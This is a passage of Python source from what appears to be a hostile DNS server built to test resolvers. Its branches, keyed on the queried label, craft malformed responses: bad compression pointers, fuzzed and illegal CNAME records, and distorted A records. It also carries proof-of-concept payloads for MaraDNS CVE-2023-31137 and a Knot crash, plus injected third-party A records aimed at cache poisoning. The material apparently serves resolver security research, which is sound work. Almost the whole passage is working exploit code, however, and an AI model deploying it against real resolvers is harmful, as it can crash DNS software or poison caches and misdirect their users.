              #####################################################################
           elif first_label.startswith("badcompresspoc6wn"):
              # Send random binary TXT record of arbitrary size ending with NULL
              # + CNAME with compression pointing to the previous TXT record
              txtsize = 10
              if req_domain_labels[1].isnumeric():
                 txtsize = int(req_domain_labels[1])
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 2, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              data    = os.urandom(txtsize)
              databin  = struct.pack(">B", len(data)+2)
              databin += struct.pack(">B", len(data))
              databin += data + b"\x00"
              # TXT
              buffer += convDom2Bin(req_domain) + getTypeBin("TXT") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # CNAME
              offset_to_the_txt = (len(req_domain)*2) + 18 + 13 ## backward pointer to the previous TXT record
              databin = b"\xc0" + struct.pack(">B", offset_to_the_txt)
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", len(databin))        ## Data length
              buffer += databin
              # log and send
              log("TXT + CNAME (poc6 with NULL)")
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("cnamefuzz1"):
              # Send bunch of bad (ill-formatted) CNAME records
              cnames = 1  # number of CNAME records to send
              if req_domain_labels[1].isnumeric():
                 cnames = int(req_domain_labels[1])
              cnamesize = 60  # CNAME size
              if req_domain_labels[2].isnumeric():
                 cnamesize = int(req_domain_labels[2])
              ### DNS header #######
              buffer = prep_dns_header(b'\x84\x00', req_QURR, cnames, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              for i in range(cnames):
                  data    = ''.join(random.choice(string.printable) for _ in range(cnamesize))
                  buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
                  buffer += struct.pack(">L", customttl)           ## TTL
                  buffer += struct.pack(">H", len(data)+2)         ## Data length
                  buffer += convDom2Bin(data)
              # log and send
              log("%d illegal CNAME records of %d B (total: %d B)" % (cnames, cnamesize, len(buffer)))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("cnamefuzz2"):
              # Send bunch of bad (random binary) CNAME records
              cnames = 1  # number of CNAME records to send
              if req_domain_labels[1].isnumeric():
                 cnames = int(req_domain_labels[1])
              cnamesize = 60  # CNAME size
              if req_domain_labels[2].isnumeric():
                 cnamesize = int(req_domain_labels[2])
              ### DNS header #######
              buffer = prep_dns_header(b'\x84\x00', req_QURR, cnames, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              for i in range(cnames):
                  data    = os.urandom(cnamesize)
                  buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
                  buffer += struct.pack(">L", customttl)           ## TTL
                  buffer += struct.pack(">H", len(data)+2)         ## Data length
                  #buffer += convData2Bin(data) + b"\x00"
                  buffer += struct.pack(">B", len(data)) + data + b"\x00"
              # log and send
              log("%d binary CNAME records of %d B (total: %d B)" % (cnames, cnamesize, len(buffer)))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("dotcname"):
              # Send illegal CNAME record with dots
              r = '{:06d}'.format(random.randint(100000, 999999))
              dom = "always" + str(r) + "." + sld_tld_domain
              variant = 0
              if req_domain_labels[1].isnumeric():
                 variant = int(req_domain_labels[1])
              match variant:
                 case 1:  # dotcname.1 - always<DOT>123456.yourdomain.com
                    bindom  = struct.pack(">B", 13)
                    bindom += bytes("always." + str(r), 'utf-8')
                    bindom += struct.pack(">B", len(sld))
                    bindom += bytes(sld, 'utf-8')
                    bindom += struct.pack(">B", len(tld))
                    bindom += bytes(tld, 'utf-8')
                    bindom += b"\x00"
                    dom  = "always<DOT>" + str(r) + "." + sld_tld_domain
                 case 2:  # dotcname.2 - always<DOT>a123456.yourdomain.com
                    bindom  = struct.pack(">B", 14)
                    bindom += bytes("always.a" + str(r), 'utf-8')
                    bindom += struct.pack(">B", len(sld))
                    bindom += bytes(sld, 'utf-8')
                    bindom += struct.pack(">B", len(tld))
                    bindom += bytes(tld, 'utf-8')
                    bindom += b"\x00"
                    dom  = "always<DOT>a" + str(r) + "." + sld_tld_domain
                 case 3:  # dotcname.3 - always123456<DOT>yourdomain.com
                    fc = "always" + str(r) + "." + sld
                    bindom  = struct.pack(">B", len(fc))
                    bindom += bytes(fc, 'utf-8')
                    bindom += struct.pack(">B", len(tld))
                    bindom += bytes(tld, 'utf-8')
                    bindom += b"\x00"
                    dom  = fc.replace(".", "<DOT>") + "." + tld
                 case 4:  # dotcname.4 - always123456.yourdomain<DOT>com
                    bindom  = struct.pack(">B", 12)
                    bindom += bytes("always" + str(r), 'utf-8')
                    bindom += struct.pack(">B", len(sld_tld_domain))
                    bindom += bytes(sld_tld_domain, 'utf-8')
                    bindom += b"\x00"
                    dom  = "always" + str(r) + "." + sld_tld_domain.replace(".", "<DOT>")
                 case 5:  # dotcname.5 - always123456.yourdomain.com<DOT>
                    bindom  = struct.pack(">B", 12)
                    bindom += bytes("always" + str(r), 'utf-8')
                    bindom += struct.pack(">B", len(sld))
                    bindom += bytes(sld, 'utf-8')
                    bindom += struct.pack(">B", len(tld)+1)
                    bindom += bytes(tld + '.', 'utf-8')
                    bindom += b"\x00"
                    dom  = "always" + str(r) + "." + sld_tld_domain + "<DOT>"
                 case 6:  # dotcname.6 - always123456.yourdomain.com.<DOT>
                    bindom  = struct.pack(">B", 12)
                    bindom += bytes("always" + str(r), 'utf-8')
                    bindom += struct.pack(">B", len(sld))
                    bindom += bytes(sld, 'utf-8')
                    bindom += struct.pack(">B", len(tld))
                    bindom += bytes(tld, 'utf-8')
                    bindom += struct.pack(">B", 1)
                    bindom += b"\x2e\x00"
                    dom  = "always" + str(r) + "." + sld_tld_domain + ".<DOT>"
                 case _:  # dotcname.7 - always123456<DOT>yourdomain<DOT>com
                    bindom  = struct.pack(">B", len(dom))
                    bindom += bytes(dom, 'utf-8')
                    bindom += b"\x00"
                    dom = dom.replace(".", "<DOT>")
                 #case _:  # dotcname.* - just a normally formatted CNAME
                 #   bindom  = struct.pack(">B", 12)
                 #   bindom += bytes("always" + str(r), 'utf-8')
                 #   bindom += struct.pack(">B", len(sld))
                 #   bindom += bytes(sld, 'utf-8')
                 #   bindom += struct.pack(">B", len(tld))
                 #   bindom += bytes(tld, 'utf-8')
                 #   bindom += b"\x00"
                 #   dom  = "always" + str(r) + "." + sld_tld_domain
              ### DNS header #######
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)         ## TTL
              buffer += struct.pack(">H", len(bindom))       ## Data length
              buffer += bindom                               ## CNAME
              # log and send
              log("CNAME %s" % (dom))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("cgena") or first_label.startswith("badcname"):
              # Send illegal CNAME record with arbitrary byte(s), with the
              # CNAME potentially resolvable (always* / 1.2.3.4)
              variant = 0
              if req_domain_labels[1].isnumeric():
                 variant = int(req_domain_labels[1])
              badbyte = 0  # the bad char
              if req_domain_labels[2].isnumeric():
                 badbyte = int(req_domain_labels[2])
              count = 1  # number of bad chars
              if req_domain_labels[3].isnumeric():
                 count = int(req_domain_labels[3])
              r = '{:06d}'.format(random.randint(1, 999999))
              match variant:
                 case 2:  # cgena.2 - <BYTE>always123456.dnslabtest1.com
                    bindom  = struct.pack(">B", 6+count+6) + badbyte.to_bytes(1, 'big')*count
                    bindom += b"always" + bytes(str(r), 'utf-8')
                    bindom += convDom2Bin(sld_tld_domain)
                    dom  = str(badbyte.to_bytes(1, 'big')*count).replace(".", "<DOT>") + "always" + str(r)
                    dom += "." + sld_tld_domain
                 case 3:  # cgena.3 - always<BYTE>123456.dnslabtest1.com
                    bindom  = struct.pack(">B", 6+count+6) + b"always" + badbyte.to_bytes(1, 'big')*count
                    bindom += bytes(str(r), 'utf-8')
                    bindom += convDom2Bin(sld_tld_domain)
                    dom  = "always" + str(badbyte.to_bytes(1, 'big')*count).replace(".", "<DOT>") + str(r)
                    dom += "." + sld_tld_domain
                 case 4:  # cgena.4 - always123456<BYTE>.dnslabtest1.com
                    bindom  = struct.pack(">B", 6+count+6) + b"always" + bytes(str(r), 'utf-8')
                    bindom += badbyte.to_bytes(1, 'big')*count
                    bindom += convDom2Bin(sld_tld_domain)
                    dom  = "always" + str(r) + str(badbyte.to_bytes(1, 'big')*count).replace(".", "<DOT>")
                    dom += "." + sld_tld_domain
                 case 5:  # cgena.5 - always123456<BYTE>dnslabtest1.com
                    fc = b"always" + bytes(str(r), 'utf-8') + badbyte.to_bytes(1, 'big')*count + bytes(sld, 'utf-8')
                    bindom  = struct.pack(">B", len(fc))
                    bindom += fc
                    bindom += struct.pack(">B", len(tld))
                    bindom += bytes(tld, 'utf-8')
                    bindom += b"\x00"
                    dom  = "always" + str(r) + str(badbyte.to_bytes(1, 'big')*count).replace(".", "<DOT>")
                    dom += sld_tld_domain
                 case 6:  # cgena.6 - always123456.dnslabtest1<BYTE>com
                    bindom  = struct.pack(">B", 12)
                    bindom += bytes("always" + str(r), 'utf-8')
                    bindom += struct.pack(">B", len(sld + tld) + count)
                    bindom += bytes(sld, 'utf-8')
                    bindom += badbyte.to_bytes(1, 'big')*count
                    bindom += bytes(tld, 'utf-8')
                    bindom += b"\x00"
                    dom  = "always" + str(r) + "." + sld
                    dom += str(badbyte.to_bytes(1, 'big')*count).replace(".", "<DOT>") + tld
                 case 7:  # cgena.7 - always123456.dnslabtest1.<BYTE>com
                    bindom  = struct.pack(">B", 12) + b"always" + bytes(str(r), 'utf-8')
                    bindom += convData2Bin(sld)
                    bindom += struct.pack(">B", count+len(tld)) + badbyte.to_bytes(1, 'big')*count
                    bindom += bytes(tld, 'utf-8') + b"\x00"
                    dom  = "always" + str(r) + "." + sld + "."
                    dom += str(badbyte.to_bytes(1, 'big')*count).replace(".", "<DOT>") + tld
                 case 8:  # cgena.8 - always123456.dnslabtest1.com<BYTE>
                    bindom  = struct.pack(">B", 12) + b"always" + bytes(str(r), 'utf-8')
                    bindom += convData2Bin(sld)
                    bindom += struct.pack(">B", count+len(tld)) + bytes(tld, 'utf-8')
                    bindom += badbyte.to_bytes(1, 'big')*count + b"\x00"
                    dom  = "always" + str(r) + "." + sld_tld_domain
                    dom += str(badbyte.to_bytes(1, 'big')*count).replace(".", "<DOT>")
                 case 9:    # cgena.9 - always123456.dnslabtest1.com.<BYTE>
                    bindom  = struct.pack(">B", 12) + b"always" + bytes(str(r), 'utf-8')
                    bindom += convData2Bin(sld_tld_domain)
                    bindom += struct.pack(">B", count) + badbyte.to_bytes(1, 'big')*count
                    bindom += b"\x00"
                    dom  = "always" + str(r) + "." + sld_tld_domain + "." 
                    dom += str(badbyte.to_bytes(1, 'big')*count).replace(".", "<DOT>")
                 case _:  # cgena.1 - <BYTE>.always123456.dnslabtest1.com
                    bindom  = struct.pack(">B", count) + badbyte.to_bytes(1, 'big')*count
                    bindom += convData2Bin("always" + str(r))
                    bindom += convDom2Bin(sld_tld_domain)
                    dom  = str(badbyte.to_bytes(1, 'big')*count).replace(".", "<DOT>")
                    dom += ".always" + str(r) + "." + sld_tld_domain
              ### DNS header #######
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)         ## TTL
              buffer += struct.pack(">H", len(bindom))       ## Data length
              buffer += bindom                               ## CNAME
              # log and send
              log("CNAME %s" % (dom))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("cgenb"):
              # Send illegal CNAME record with arbitrary byte(s), with the CNAME unresolvable (bad*)
              variant = 0
              if req_domain_labels[1].isnumeric():
                 variant = int(req_domain_labels[1])
              badbyte = 0  # the bad char
              if req_domain_labels[2].isnumeric():
                 badbyte = int(req_domain_labels[2])
              count = 1  # number of bad chars
              if req_domain_labels[3].isnumeric():
                 count = int(req_domain_labels[3])
              r = '{:06d}'.format(random.randint(1, 999999))
              match variant:
                 case 2:  # cgenb.2 - <BYTE>nonres123456.dnslabtest1.com
                    bindom  = struct.pack(">B", 6+count+6) + badbyte.to_bytes(1, 'big')*count
                    bindom += b"nonres" + bytes(str(r), 'utf-8')
                    bindom += convDom2Bin(sld_tld_domain)
                    dom  = str(badbyte.to_bytes(1, 'big')*count).replace(".", "<DOT>") + "nonres" + str(r)
                    dom += "." + sld_tld_domain
                 case 3:  # cgenb.3 - nonres<BYTE>123456.dnslabtest1.com
                    bindom  = struct.pack(">B", 6+count+6) + b"nonres" + badbyte.to_bytes(1, 'big')*count
                    bindom += bytes(str(r), 'utf-8')
                    bindom += convDom2Bin(sld_tld_domain)
                    dom  = "nonres" + str(badbyte.to_bytes(1, 'big')*count).replace(".", "<DOT>") + str(r)
                    dom += "." + sld_tld_domain
                 case 4:  # cgenb.4 - nonres123456<BYTE>.dnslabtest1.com
                    bindom  = struct.pack(">B", 6+count+6) + b"nonres" + bytes(str(r), 'utf-8')
                    bindom += badbyte.to_bytes(1, 'big')*count
                    bindom += convDom2Bin(sld_tld_domain)
                    dom  = "nonres" + str(r) + str(badbyte.to_bytes(1, 'big')*count).replace(".", "<DOT>")
                    dom += "." + sld_tld_domain
                 case 5:  # cgenb.5 - nonres123456<BYTE>dnslabtest1.com
                    fc = b"nonres" + bytes(str(r), 'utf-8') + badbyte.to_bytes(1, 'big')*count + bytes(sld, 'utf-8')
                    bindom  = struct.pack(">B", len(fc))
                    bindom += fc
                    bindom += struct.pack(">B", len(tld))
                    bindom += bytes(tld, 'utf-8')
                    bindom += b"\x00"
                    dom  = "nonres" + str(r) + str(badbyte.to_bytes(1, 'big')*count).replace(".", "<DOT>")
                    dom += sld_tld_domain
                 case 6:  # cgenb.6 - nonres123456.dnslabtest1<BYTE>com
                    bindom  = struct.pack(">B", 12)
                    bindom += bytes("nonres" + str(r), 'utf-8')
                    bindom += struct.pack(">B", len(sld + tld) + count)
                    bindom += bytes(sld, 'utf-8')
                    bindom += badbyte.to_bytes(1, 'big')*count
                    bindom += bytes(tld, 'utf-8')
                    bindom += b"\x00"
                    dom  = "nonres" + str(r) + "." + sld
                    dom += str(badbyte.to_bytes(1, 'big')*count).replace(".", "<DOT>") + tld
                 case 7:  # cgenb.7 - nonres123456.dnslabtest1.<BYTE>com
                    bindom  = struct.pack(">B", 12) + b"nonres" + bytes(str(r), 'utf-8')
                    bindom += convData2Bin(sld)
                    bindom += struct.pack(">B", count+len(tld)) + badbyte.to_bytes(1, 'big')*count
                    bindom += bytes(tld, 'utf-8') + b"\x00"
                    dom  = "nonres" + str(r) + "." + sld + "."
                    dom += str(badbyte.to_bytes(1, 'big')*count).replace(".", "<DOT>") + tld
                 case 8:  # cgenb.8 - nonres123456.dnslabtest1.com<BYTE>
                    bindom  = struct.pack(">B", 12) + b"nonres" + bytes(str(r), 'utf-8')
                    bindom += convData2Bin(sld)
                    bindom += struct.pack(">B", count+len(tld)) + bytes(tld, 'utf-8')
                    bindom += badbyte.to_bytes(1, 'big')*count + b"\x00"
                    dom  = "nonres" + str(r) + "." + sld_tld_domain
                    dom += str(badbyte.to_bytes(1, 'big')*count).replace(".", "<DOT>")
                 case 9:  # cgenb.9 - nonres123456.dnslabtest1.com.<BYTE>
                    bindom  = struct.pack(">B", 12) + b"nonres" + bytes(str(r), 'utf-8')
                    bindom += convData2Bin(sld_tld_domain)
                    bindom += struct.pack(">B", count) + badbyte.to_bytes(1, 'big')*count
                    bindom += b"\x00"
                    dom  = "nonres" + str(r) + "." + sld_tld_domain + "." 
                    dom += str(badbyte.to_bytes(1, 'big')*count).replace(".", "<DOT>")
                 case _:  # cgenb.1 - <BYTE>.nonres123456.dnslabtest1.com
                    bindom  = struct.pack(">B", count) + badbyte.to_bytes(1, 'big')*count
                    bindom += convData2Bin("nonres" + str(r))
                    bindom += convDom2Bin(sld_tld_domain)
                    dom  = str(badbyte.to_bytes(1, 'big')*count).replace(".", "<DOT>")
                    dom += ".nonres" + str(r) + "." + sld_tld_domain
              ### DNS header #######
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)         ## TTL
              buffer += struct.pack(">H", len(bindom))       ## Data length
              buffer += bindom                               ## CNAME
              # log and send
              log("CNAME %s" % (dom))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("illcname"):
              # Send illegal CNAME record of various schemes
              r = '{:06d}'.format(random.randint(1, 999999))
              variant = 0
              if req_domain_labels[1].isnumeric():
                 variant = int(req_domain_labels[1])
              match variant:
                 case 1:  # illcname.0 - http://always123456.dnslabtest1.com/
                    dom = "http://always" + r + "." + sld_tld_domain + "/"
                 case 2:  # illcname.1 - http://always123456.dnslabtest1.com:80/
                    dom = "http://always" + r + "." + sld_tld_domain + ":80/"
                 case 3:  # illcname.2 - https://always123456.dnslabtest1.com/
                    dom = "https://always" + r + "." + sld_tld_domain + "/"
                 case 4:  # illcname.3 - https://always123456.dnslabtest1.com:443/
                    dom = "https://always" + r + "." + sld_tld_domain + ":443/"
                 case 5:  # illcname.4 - always123456.dnslabtest1.com:80
                    dom = "always" + r + "." + sld_tld_domain + ":80"
                 case 6:  # illcname.5 - always123456.dnslabtest1.com:443
                    dom = "always" + r + "." + sld_tld_domain + ":443"
                 case 7:  # illcname.6 - 1.2.3.4 (in DNS name notation as 4 labels)
                    dom = "1.2.3.4"
                 case 8:  # illcname.7 - 1.2.3.4:80 (in DNS name notation as 4 labels)
                    dom = "1.2.3.4:80"
                 case 9:  # illcname.8 - 1.2.3.4 (in DNS name notation as 1 label)
                    dom = "1<DOT>2<DOT>3<DOT>4"
                 case 10:  # illcname.9 - 1.2.3.4:80 (in DNS name notation as 1 label)
                    dom = "1<DOT>2<DOT>3<DOT>4:80"
                 case 11:  # illcname.10 - <OUR-IP-ADDRESS> (in DNS name notation as 4 labels)
                    ourip = ZONEFILE["ns1." + sld_tld_domain]["A"]
                    dom = ourip
                 case _:  # illcname.11 - <OUT-IP-ADDRESS>:80 (in DNS name notation as 4 labels)
                    ourip = ZONEFILE["ns1." + sld_tld_domain]["A"]
                    dom = ourip + ":80"
              ### DNS header #######
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              bindom = convDom2Bin(dom)
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)         ## TTL
              buffer += struct.pack(">H", len(bindom))       ## Data length
              buffer += bindom                               ## CNAME
              # log and send
              log("CNAME %s" % (dom))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("afuzz1"):
              # todo: Send A record with a slightly distorted name.
              byte = 65
              if req_domain_labels[1].isnumeric():
                 byte = int(req_domain_labels[1])
              if byte > 255: byte = 255
              ### DNS header #######
              buffer = prep_dns_header(b'\x84\x00', req_QURR, 1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              newip = "6.6.6." + str(byte)
              tmpdom = convDom2Bin(req_domain) # first convert to dns name notation
              newdom = tmpdom[0:3]              #  \
              newdom += struct.pack(">B", byte) #    > replace the 3rd char with chosen byte
              newdom += tmpdom[4:]              #  /
              # A
              buffer += newdom + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)              ## TTL
              buffer += struct.pack(">H", 4)                      ## Data length
              buffer += socket.inet_aton(newip)                   ## IP
              # log and send
              strdom = req_domain[0:2]
              strdom += "\\x%0.2x" % byte
              strdom += req_domain[3:]
              log("A %s -> %s" % (strdom, newip))
              send_buf(self, buffer)
           elif first_label.startswith("afuzz2"):
              # Send many A records with a slightly distorted name. In the end, provide the correct one also
              # af<01>zz2.dnslabtest1.com   A   6.6.6.1
              # af<02>zz2.dnslabtest1.com   A   6.6.6.2
              # af<03>zz2.dnslabtest1.com   A   6.6.6.3
              # ...
              # af<fe>zz2.dnslabtest1.com   A   6.6.6.254
              # af<ff>zz2.dnslabtest1.com   A   6.6.6.255
              # afuzz2.dnslabtest1.com   A   1.2.3.4
              answers = 1
              if req_domain_labels[1].isnumeric():
                 answers = int(req_domain_labels[1])
              if answers > 256: answers = 256
              ### DNS header #######
              buffer = prep_dns_header(b'\x84\x00', req_QURR, answers+1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              #for b in range(1, 255):
              tmpdom = convDom2Bin(req_domain)
              # multiple bad A
              for b in range(1, answers+1):
                  newip = "6.6.6." + str(b-1)
                  newdom = tmpdom[0:3]
                  newdom += struct.pack(">B", b-1)
                  newdom += tmpdom[4:]
                  buffer += newdom + getTypeBin("A") + getClassBin("IN")
                  buffer += struct.pack(">L", customttl)          ## TTL
                  buffer += struct.pack(">H", 4)                  ## Data length
                  buffer += socket.inet_aton(newip)               ## IP
              # good A
              buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              buffer += struct.pack(">L", customttl)           ## TTL
              buffer += struct.pack(">H", 4)                   ## Data length
              buffer += socket.inet_aton("2.3.4.5")            ## IP
              # log and send
              log("%d bogus A records + legit A record" % (answers))
              send_buf(self, buffer)
              #####################################################################
           elif len(req_domain) == 253 and first_label.startswith("long"):
              nans = 241
              #nans = 230
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', req_QURR, nans+1, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              ### ANSWER SECTION ########
              try:
                 opcode = first_label[4]
              except:
                 opcode = "0"
              match opcode:
                 case "0":  # long0...
                    for i in range(nans):
                        dom = "long0"
                        for i in range(5):
                            dom += '.' + ''.join(random.choice(string.ascii_lowercase + string.digits))
                        dom += req_domain[15:255]
                        randip = '.'.join(str(random.randint(0, 255)) for _ in range(4))
                        buffer += convDom2Bin(dom) + getTypeBin("A") + getClassBin("IN")
                        buffer += struct.pack(">L", customttl)     ## TTL
                        buffer += struct.pack(">H", 4)             ## Data length
                        buffer += socket.inet_aton(randip)         ## IP
                    # proper answer in the end
                    buffer += convDom2Bin(req_domain) + getTypeBin("A") + getClassBin("IN")
                    buffer += struct.pack(">L", customttl)     ## TTL
                    buffer += struct.pack(">H", 4)             ## Data length
                    buffer += socket.inet_aton("6.6.6.6")      ## IP
                 case _:  # long1...
                    for i in range(nans):
                        dom = req_domain[0:227]
                        for i in range(5):
                            dom += '.' + ''.join(random.choice(string.ascii_lowercase + string.digits))
                        dom += '.' + sld_tld_domain
                        randip = '.'.join(str(random.randint(0, 255)) for _ in range(4))
                        buffer += convDom2Bin(dom) + getTypeBin("A") + getClassBin("IN")
                        buffer += struct.pack(">L", customttl)     ## TTL
                        buffer += struct.pack(">H", 4)             ## Data length
                        buffer += socket.inet_aton(randip)         ## IP
                    # proper answer in the end
                    buffer += convDom2Bin(req_domain) + getTypeBin("A") + getClassBin("IN")
                    buffer += struct.pack(">L", customttl)     ## TTL
                    buffer += struct.pack(">H", 4)             ## Data length
                    buffer += socket.inet_aton("6.6.6.5")      ## IP
              # log and send
              log("%d randomized long A records (total: %d B)" % (nans+1, len(buffer)))
              send_buf(self, buffer)
             #####################################################################
           elif first_label.startswith("maradns01"):
              # CVE-2023-31137
              # 05 39 # Transaction ID
              # 81 a0 # Flags
              # 00 00 # QDCount
              # 00 01 # ANCount
              # 00 00 # NSCount
              # 00 00 # ARCount
              # 
              # 00    # Invalid qname. Using a valid name or "\xc0\x0c" also works.
              # 00 10 # Qtype 16  (TXT Record)
              # 00 01 # Class 1   (NS)
              # 00 00 01 2c # TTL (300)
              # 00 00 # RDlen
              # 07 68 74 65 6a 65 64 61 00 #RData "htejeda\x00"
              ### DNS header ########
              buffer = prep_dns_header(b'\x81\xa0', 0, 1, 0, 0)
              ### QUESTION SECTION ########
              ### ANSWER SECTION ########
              buffer += b'\x00' + getTypeBin("TXT") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)          ## TTL
              buffer += struct.pack(">H", 0)                  ## Data length
              buffer +=  convDom2Bin("htejeda")
              # log and send
              log("maradns01poc")
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("maradns02"):
              # CVE-2023-31137
              # 05 39 # Transaction ID
              # 81 a0 # Flags
              # 00 00 # QDCount
              # 00 01 # ANCount
              # 00 00 # NSCount
              # 00 00 # ARCount
              # 
              # 00    # Invalid qname. Using a valid name or "\xc0\x0c" also works.
              # 00 10 # Qtype 16  (TXT Record)
              # 00 01 # Class 1   (NS)
              # 00 00 01 2c # TTL (300)
              # 00 00 # RDlen
              # 07 68 74 65 6a 65 64 61 #RData "htejeda"
              ### DNS header ########
              buffer = prep_dns_header(b'\x81\xa0', 0, 1, 0, 0)
              ### QUESTION SECTION ########
              ### ANSWER SECTION ########
              buffer += b'\x00' + getTypeBin("TXT") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)          ## TTL
              buffer += struct.pack(">H", 0)                  ## Data length
              buffer +=  b'\x07htejeda'
              # log and send
              log("maradns01poc")
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("knot1poc"):
              # Send arbitrary number of NULLs
              nulls = 2 # number of NULLs to send (by default 2)
              if req_domain_labels[1].isnumeric():
                 nulls = int(req_domain_labels[1])
              buffer = b"\x00" * nulls
              log("only %d NULL(s)" % (nulls))
              if proto == "tcp":
                 send_buf_wo_len(self, buffer)
              else:
                 send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("inj01"):
              # Send 1 CNAME + 1 injected A record
              injip = "6.6.6.1"
              enddom = "end." + sld_tld_domain
              resp_QURR = req_QURR
              addedquestions = b''
              if "3rdparty" in req_domain_labels:  # inject a 3rd party domain
                 injdom = "injected01." + a3rdparty_domain
              else:
                 injdom = "injected01." + sld_tld_domain
              if "replq" in req_domain_labels:  # replace the question with our injected stuffs
                 orig_req_domain = req_domain
                 req_domain = injdom
                 addcustomlog("REPLQ")
              if "addq" in req_domain_labels:  # add additional question for our injected stuffs
                 resp_QURR = req_QURR+1
                 addedquestions  = convDom2Bin(injdom) + req_type_bin + req_class_bin
                 addcustomlog("ADDQ")
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', resp_QURR, 2, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              buffer += addedquestions
              ### ANSWER SECTION ########
              # CNAME
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", len(enddom)+2)            ## Data length
              buffer += convDom2Bin(enddom)                         ## CNAME value
              # injected A
              buffer += convDom2Bin(injdom) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)                ## TTL
              buffer += struct.pack(">H", 4)                        ## Data length
              buffer += socket.inet_aton(injip)                     ## IP
              # log and send
              log("CNAME %s + A %s (%s)" % (enddom, injdom, injip))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("inj02"):
              # Send 1 injected A record + 1 CNAME
              injip = "6.6.6.2"
              enddom = "end." + sld_tld_domain
              resp_QURR = req_QURR
              addedquestions = b''
              if "3rdparty" in req_domain_labels:  # inject a 3rd party domain
                 injdom = "injected02." + a3rdparty_domain
              else:
                 injdom = "injected02." + sld_tld_domain
              ### QUESTION SECTION ########
              if "replq" in req_domain_labels:  # replace the question with our injected stuffs
                 orig_req_domain = req_domain
                 req_domain = injdom
                 addcustomlog("REPLQ")
              if "addq" in req_domain_labels:  # add additional question for our injected stuffs
                 resp_QURR = req_QURR+1
                 addedquestions  = convDom2Bin(injdom) + req_type_bin + req_class_bin
                 addcustomlog("ADDQ")
              ### DNS header ########
              buffer = prep_dns_header(b'\x84\x00', resp_QURR, 2, 0, 0)
              ### QUESTION SECTION ########
              if noq: buffer += convDom2Bin(req_domain) + req_type_bin + req_class_bin
              buffer += addedquestions
              ### ANSWER SECTION ########
              # injected A
              buffer += convDom2Bin(injdom) + getTypeBin("A") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              buffer += struct.pack(">H", 4)                       ## Data length
              buffer += socket.inet_aton(injip)                    ## IP
              # CNAME
              buffer += convDom2Bin(req_domain) + getTypeBin("CNAME") + getClassBin("IN")
              buffer += struct.pack(">L", customttl)               ## TTL
              buffer += struct.pack(">H", len(enddom)+2)           ## Data length
              buffer += convDom2Bin(enddom)                        ## CNAME value
              # log and send
              log("A %s (%s) + CNAME %s" % (injdom, injip, enddom))
              send_buf(self, buffer)
              #####################################################################
           elif first_label.startswith("inj03"):
              # Send 1 legit A record + 1 injected A record
              ip = "1.2.3.4"
              injip = "6.6.6.3"
              resp_QURR = req_QURR
              addedquestions = b''
